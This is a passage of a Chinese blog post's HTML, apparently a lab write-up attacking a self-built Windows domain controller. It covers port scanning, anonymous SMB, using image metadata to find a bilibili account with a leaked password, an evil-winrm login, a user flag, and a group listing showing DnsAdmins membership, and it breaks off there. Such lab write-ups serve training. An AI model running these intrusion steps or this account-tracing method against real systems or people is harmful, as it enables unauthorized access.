@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="信息收集\r主机确认\n┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ echo ip=192.168.174.143&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ . start.sh ┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ ping $ip PING 192.168.174.143 (192.168.174.143) 56(84) bytes of data. 64 bytes from 192.168.174.143: icmp_seq=1 ttl=128 time=0.691 ms 64 bytes from 192.168.174.143: icmp_seq=2 ttl=128 time=1.27 ms 端口扫描\n┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ rustscan -a $ip .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- You miss 100% of the ports you don&#39;t scan. - RustScan [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 192.168.174.143:53 Open 192.168.174.143:88 Open 192.168.174.143:135 Open 192.168.174.143:139 Open 192.168.174.143:389 Open 192.168.174.143:445 Open 192.168.174.143:464 Open 192.168.174.143:593 Open 192.168.174.143:636 Open 192.168.174.143:3268 Open 192.168.174.143:3269 Open 192.168.174.143:3389 Open 192.168.174.143:5357 Open 192.168.174.143:5985 Open 192.168.174.143:9389 简单扫描了一下确认为dc域控，那就不详细扫描了直接测试主要端口\n">
+<title>bicker-wp</title>
+
+<link rel='canonical' href='http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="bicker-wp">
+<meta property='og:description' content="信息收集\r主机确认\n┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ echo ip=192.168.174.143&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ . start.sh ┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ ping $ip PING 192.168.174.143 (192.168.174.143) 56(84) bytes of data. 64 bytes from 192.168.174.143: icmp_seq=1 ttl=128 time=0.691 ms 64 bytes from 192.168.174.143: icmp_seq=2 ttl=128 time=1.27 ms 端口扫描\n┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ rustscan -a $ip .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- You miss 100% of the ports you don&#39;t scan. - RustScan [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 192.168.174.143:53 Open 192.168.174.143:88 Open 192.168.174.143:135 Open 192.168.174.143:139 Open 192.168.174.143:389 Open 192.168.174.143:445 Open 192.168.174.143:464 Open 192.168.174.143:593 Open 192.168.174.143:636 Open 192.168.174.143:3268 Open 192.168.174.143:3269 Open 192.168.174.143:3389 Open 192.168.174.143:5357 Open 192.168.174.143:5985 Open 192.168.174.143:9389 简单扫描了一下确认为dc域控，那就不详细扫描了直接测试主要端口\n">
+<meta property='og:url' content='http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/'>
+<meta property='og:site_name' content='wackymaker'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='靶机' /><meta property='article:tag' content='自建靶机' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-08-25T15:15:18&#43;08:00'/><meta property='article:modified_time' content='2025-08-25T15:15:18&#43;08:00'/>
+<meta name="twitter:title" content="bicker-wp">
+<meta name="twitter:description" content="信息收集\r主机确认\n┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ echo ip=192.168.174.143&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ . start.sh ┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ ping $ip PING 192.168.174.143 (192.168.174.143) 56(84) bytes of data. 64 bytes from 192.168.174.143: icmp_seq=1 ttl=128 time=0.691 ms 64 bytes from 192.168.174.143: icmp_seq=2 ttl=128 time=1.27 ms 端口扫描\n┌──(wackymaker㉿kali)-[~/tmp/synthetic/bicker] └─$ rustscan -a $ip .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- You miss 100% of the ports you don&#39;t scan. - RustScan [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 192.168.174.143:53 Open 192.168.174.143:88 Open 192.168.174.143:135 Open 192.168.174.143:139 Open 192.168.174.143:389 Open 192.168.174.143:445 Open 192.168.174.143:464 Open 192.168.174.143:593 Open 192.168.174.143:636 Open 192.168.174.143:3268 Open 192.168.174.143:3269 Open 192.168.174.143:3389 Open 192.168.174.143:5357 Open 192.168.174.143:5985 Open 192.168.174.143:9389 简单扫描了一下确认为dc域控，那就不详细扫描了直接测试主要端口\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_6baab66dae07af16.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">wackymaker</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/wackymaker'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#突破边界">突破边界</a></li>
+    <li><a href="#域内提权">域内提权</a></li>
+    <li><a href="#dnsadmin利用提权">dnsadmin利用提权</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E9%A2%98%E7%9B%AEwp/" >
+                题目wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/bicher-%E8%87%AA%E5%BB%BA/">bicker-wp</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 25, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    4 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="信息收集">信息收集
+</h2><p>主机确认</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo ip<span style="color:#f92672">=</span>192.168.174.143&gt;start.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ping $ip
+</span></span><span style="display:flex;"><span>PING 192.168.174.143 <span style="color:#f92672">(</span>192.168.174.143<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.174.143: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.691 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.174.143: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>1.27 ms
+</span></span></code></pre></div><p>端口扫描</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ rustscan -a $ip
+</span></span><span style="display:flex;"><span>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span style="display:flex;"><span>| <span style="color:#f92672">{}</span>  <span style="color:#f92672">}</span>| <span style="color:#f92672">{</span> <span style="color:#f92672">}</span> |<span style="color:#f92672">{</span> <span style="color:#f92672">{</span>__ <span style="color:#f92672">{</span>_   _<span style="color:#f92672">}{</span> <span style="color:#f92672">{</span>__  /  ___<span style="color:#f92672">}</span> / <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\ </span>|  <span style="color:#e6db74">`</span>| |
+</span></span><span style="display:flex;"><span>| .-. <span style="color:#ae81ff">\|</span> <span style="color:#f92672">{</span>_<span style="color:#f92672">}</span> |.-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span> | |  .-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span><span style="color:#ae81ff">\ </span>    <span style="color:#f92672">}</span>/  /<span style="color:#ae81ff">\ </span> <span style="color:#ae81ff">\|</span> |<span style="color:#ae81ff">\ </span> |
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39; `-&#39;</span><span style="color:#e6db74">`</span>-----<span style="color:#e6db74">&#39;`----&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;  `----&#39;</span>  <span style="color:#e6db74">`</span>---<span style="color:#e6db74">&#39; `-&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;`-&#39;</span> <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Modern Day Port Scanner.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: http://discord.skerritt.blog         :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: https://github.com/RustScan/RustScan :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> --------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">You miss 100% of the ports you don&#39;</span>t scan. - RustScan
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> The config file is expected to be at <span style="color:#e6db74">&#34;/home/wackymaker/.rustscan.toml&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Your file limit is very small, which negatively impacts RustScan<span style="color:#e6db74">&#39;s speed. Use the Docker image, or up the Ulimit with &#39;</span>--ulimit 5000<span style="color:#960050;background-color:#1e0010">&#39;</span>. 
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:53
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:88
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:135
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:139
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:389
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:445
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:464
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:593
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:636
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:3268
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:3269
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:3389
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:5357
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:5985
+</span></span><span style="display:flex;"><span>Open 192.168.174.143:9389
+</span></span></code></pre></div><p>简单扫描了一下确认为dc域控，那就不详细扫描了直接测试主要端口</p>
+<h2 id="突破边界">突破边界
+</h2><p><img src="/bicker/image.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>存在smb匿名，直接连接puppy，发现一张图片</p>
+<p><img src="/bicker/image-1.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>一张意义不明的图片</p>
+<p><img src="/bicker/image-2.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>查看元数据，察觉到不对劲的地方</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ exiftool puppy.jpg 
+</span></span><span style="display:flex;"><span>ExifTool Version Number         : 13.10
+</span></span><span style="display:flex;"><span>File Name                       : puppy.jpg
+</span></span><span style="display:flex;"><span>Directory                       : .
+</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">58</span> kB
+</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2025:08:15 21:50:13-04:00
+</span></span><span style="display:flex;"><span>File Access Date/Time           : 2025:08:15 21:50:50-04:00
+</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2025:08:15 21:50:13-04:00
+</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
+</span></span><span style="display:flex;"><span>File Type                       : JPEG
+</span></span><span style="display:flex;"><span>File Type Extension             : jpg
+</span></span><span style="display:flex;"><span>MIME Type                       : image/jpeg
+</span></span><span style="display:flex;"><span>JFIF Version                    : 1.01
+</span></span><span style="display:flex;"><span>Resolution Unit                 : inches
+</span></span><span style="display:flex;"><span>X Resolution                    : <span style="color:#ae81ff">1200</span>
+</span></span><span style="display:flex;"><span>Y Resolution                    : <span style="color:#ae81ff">1200</span>
+</span></span><span style="display:flex;"><span>Exif Byte Order                 : Little-endian <span style="color:#f92672">(</span>Intel, II<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Image Description               : bilibili
+</span></span><span style="display:flex;"><span>Orientation                     : Horizontal <span style="color:#f92672">(</span>normal<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Software                        : Google
+</span></span><span style="display:flex;"><span>Artist                          : uid<span style="color:#f92672">=</span><span style="color:#ae81ff">3546958956333518</span>
+</span></span><span style="display:flex;"><span>Exif Version                    : <span style="color:#ae81ff">0220</span>
+</span></span><span style="display:flex;"><span>Exif Image Width                : <span style="color:#ae81ff">620</span>
+</span></span><span style="display:flex;"><span>Exif Image Height               : <span style="color:#ae81ff">381</span>
+</span></span><span style="display:flex;"><span>Image Width                     : <span style="color:#ae81ff">620</span>
+</span></span><span style="display:flex;"><span>Image Height                    : <span style="color:#ae81ff">381</span>
+</span></span><span style="display:flex;"><span>Encoding Process                : Baseline DCT, Huffman coding
+</span></span><span style="display:flex;"><span>Bits Per Sample                 : <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>Color Components                : <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>Y Cb Cr Sub Sampling            : YCbCr4:2:0 <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> 2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Image Size                      : 620x381
+</span></span><span style="display:flex;"><span>Megapixels                      : 0.236
+</span></span></code></pre></div><p>在其中发现bilibili以及uid关键字，去b站查找到定位账号</p>
+<p><img src="/bicker/image-3.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>从该用户个人动态获取泄露信息，获取账号密码</p>
+<pre tabindex="0"><code>tindalos/Th3C@ll0fCtHu1hu!
+</code></pre><p>测试连接成功，获取user</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo user1<span style="color:#f92672">=</span>tindalos&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo pass1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Th3C@ll0fCtHu1hu!&#39;</span>&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/bicker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i $ip -u $user1 -p $pass1
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint 
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos<span style="color:#ae81ff">\D</span>ocuments&gt; cd ../
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos&gt; cd desk*
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>user<span style="color:#f92672">{</span>f3a9d2b1c4e87a5f6d9b<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos<span style="color:#ae81ff">\D</span>esktop&gt; 
+</span></span></code></pre></div><h2 id="域内提权">域内提权
+</h2><p>tindalos是dnsadmin的组员</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>组名                                        类型   SID                                          属性
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===========================================</span> <span style="color:#f92672">======</span> <span style="color:#f92672">============================================</span> <span style="color:#f92672">======================================</span>
+</span></span><span style="display:flex;"><span>Everyone                                    已知组 S-1-1-0                                      必需的组, 启用于默认, 启用的组
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\R</span>emote Desktop Users                别名   S-1-5-32-555                                 必需的组, 启用于默认, 启用的组
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\R</span>emote Management Users             别名   S-1-5-32-580                                 必需的组, 启用于默认, 启用的组
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers                               别名   S-1-5-32-545                                 必需的组, 启用于默认, 启用的组
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access  别名   S-1-5-32-554                                 必需的组, 启用于默认, 启用的组
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK                        已知组 S-1-5-2                                      必需的组, 启用于默认, 启用的组
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users            已知组 S-1-5-11                                     必需的组, 启用于默认, 启用的组
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization              已知组 S-1-5-15                                     必需的组, 启用于默认, 启用的组
+</span></span><span style="display:flex;"><span>BICKER<span style="color:#ae81ff">\D</span>nsAdmins                            别名   S-1-5-21-298176814-2846777796-698167141-1101 必需的组, 启用于默认, 启用的组, 本地组
